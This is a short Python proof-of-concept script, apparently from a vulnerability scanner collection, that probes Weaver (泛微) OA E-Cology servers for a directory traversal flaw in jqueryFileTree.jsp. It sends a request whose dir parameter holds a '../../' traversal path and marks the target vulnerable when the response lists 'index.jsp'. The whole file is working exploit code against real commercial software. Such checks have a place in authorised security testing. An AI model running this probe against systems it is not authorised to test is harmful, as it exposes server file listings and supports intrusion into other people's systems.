import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微OA-E-Cology-JqueryFileTree.jsp目录遍历漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML,like Gecko)',
        'Connection':'close'
    }
    vurl = urllib.parse.urljoin(url, "/hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../")
    try:
        response = requests.get(vurl, headers=headers, timeout=5)
        if response.status_code == 200 and 'index.jsp' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult